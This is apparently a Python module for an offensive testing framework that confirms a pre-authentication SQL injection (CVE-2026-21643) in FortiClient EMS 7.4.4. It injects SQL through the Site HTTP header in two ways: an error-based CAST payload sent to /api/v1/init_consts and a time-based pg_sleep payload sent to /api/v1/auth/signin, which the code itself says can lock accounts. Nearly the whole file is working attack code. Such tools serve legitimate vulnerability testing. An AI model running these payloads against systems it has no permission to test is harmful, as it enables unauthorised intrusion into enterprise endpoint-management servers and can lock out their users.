#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import time
from typing import Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "FortiClient EMS CVE-2026-21643 pre-auth SQLi confirmation",
        "description": (
            "Actively confirms CVE-2026-21643 (FortiClient EMS 7.4.4 multi-tenant) by "
            "injecting SQL through the Site HTTP header. Default path is error-based "
            "GET /api/v1/init_consts (safe, no lockout). Optional time-based POST "
            "/api/v1/auth/signin (locks out after ~3 attempts)."
        ),
        "author": ["Alireza", "Bishop Fox", "KittySploit Team"],
        "cve": ["CVE-2026-21643"],
        "references": [
            "https://fortiguard.fortinet.com/psirt/FG-IR-25-1142",
            "https://bishopfox.com/blog/cve-2026-21643-pre-authentication-sql-injection-in-forticlient-ems-7-4-4",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-21643"],
        "tags": [
            "fortinet",
            "forticlient",
            "ems",
            "sqli",
            "pre-auth",
            "postgresql",
            "cve-2026-21643"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["forticlient", "fortinet", "ems"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/api/v1/init_consts"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(443, "FortiClient EMS HTTPS port", True)
    ssl = OptBool(True, "Use HTTPS", True, advanced=True)
    endpoint = OptChoice(
        "init",
        "Probe endpoint: init (error-based), signin (time-based), both",
        required=False,
        choices=["init", "signin", "both"],
    )
    marker = OptString(
        "ks_cve_2026_21643_test",
        "Unique string cast to int for error-based reflection",
        required=False,
        advanced=True,
    )
    sleep_seconds = OptInteger(
        5,
        "pg_sleep() seconds for signin time-based probe (pgbouncer may double it)",
        required=False,
        advanced=True,
    )

    def _opt(self, option):
        if hasattr(option, "value"):
            return option.value
        return option

    def _timeout(self) -> int:
        return max(int(self.timeout or 15), 10)

    def _check_init_consts(self) -> Tuple[bool, str]:
        marker = str(self._opt(self.marker) or "ks_cve_2026_21643_test").strip()
        # Break out of SET search_path and force a PostgreSQL cast error that echoes the marker.
        payload = f"x'; SELECT CAST('{marker}' AS int)--"
        response = self.http_request(
            method="GET",
            path="/api/v1/init_consts",
            headers={"Site": payload, "Connection": "close"},
            allow_redirects=False,
            timeout=self._timeout(),
        )
        if not response:
            return False, "No response from /api/v1/init_consts"

        body = response.text or ""
        if response.status_code == 500 and marker in body:
            leak = re.sub(r"\s+", " ", body).strip()[:300]
            return True, f"Error-based SQLi confirmed on init_consts (HTTP 500): {leak}"

        return False, (
            f"init_consts did not reflect cast error "
            f"(HTTP {response.status_code})"
        )

    def _check_signin(self) -> Tuple[bool, str]:
        sleep_s = max(int(self._opt(self.sleep_seconds) or 5), 1)
        # pgbouncer may execute twice → expect ~2x sleep.
        payload = f"x'; SELECT pg_sleep({sleep_s})--"
        timeout = max(self._timeout(), sleep_s * 3 + 10)

        start = time.time()
        baseline_resp = self.http_request(
            method="POST",
            path="/api/v1/auth/signin",
            headers={"Site": "default", "Connection": "close"},
            allow_redirects=False,
            timeout=timeout,
        )
        baseline = time.time() - start
        if not baseline_resp:
            return False, "No baseline response from /api/v1/auth/signin"

        start = time.time()
        injected_resp = self.http_request(
            method="POST",
            path="/api/v1/auth/signin",
            headers={"Site": payload, "Connection": "close"},
            allow_redirects=False,
            timeout=timeout,
        )
        injected = time.time() - start

        # Read timeout / missing response after long wait often means sleep executed.
        if injected_resp is None and injected >= (baseline + sleep_s * 1.5):
            return True, (
                f"Time-based SQLi likely on auth/signin "
                f"(baseline={baseline:.2f}s, timeout/hang={injected:.2f}s)"
            )

        # Expect ~2x pg_sleep under pgbouncer; require clear delta vs baseline.
        threshold = baseline + max(sleep_s * 1.5, 8)
        if injected >= threshold:
            return True, (
                f"Time-based SQLi confirmed on auth/signin "
                f"(baseline={baseline:.2f}s, injected={injected:.2f}s)"
            )

        return False, (
            f"No significant delay on auth/signin "
            f"(baseline={baseline:.2f}s, injected={injected:.2f}s)"
        )

    def check(self):
        selected = str(self._opt(self.endpoint) or "init")
        if selected in ("init", "both"):
            ok, reason = self._check_init_consts()
            if ok:
                return {"vulnerable": True, "reason": reason, "confidence": "high"}
            if selected == "init":
                return {"vulnerable": False, "reason": reason, "confidence": "medium"}

        if selected in ("signin", "both"):
            ok, reason = self._check_signin()
            return {
                "vulnerable": ok,
                "reason": reason,
                "confidence": "high" if ok else "medium",
            }

        return {"vulnerable": False, "reason": "No endpoint selected", "confidence": "low"}

    def run(self):
        print_status("CVE-2026-21643 — FortiClient EMS pre-auth SQLi confirmation")
        selected = str(self._opt(self.endpoint) or "init")
        found = False

        if selected in ("init", "both"):
            print_status("Testing error-based SQLi on /api/v1/init_consts")
            ok, reason = self._check_init_consts()
            if ok:
                print_success(reason)
                found = True
            else:
                print_info(reason)

        if selected in ("signin", "both"):
            print_warning(
                "auth/signin probe may lock accounts after ~3 failed attempts"
            )
            print_status("Testing time-based SQLi on /api/v1/auth/signin")
            ok, reason = self._check_signin()
            if ok:
                print_success(reason)
                found = True
            else:
                print_info(reason)

        if not found:
            print_error("Target does not appear vulnerable to CVE-2026-21643")
            return False
        return True
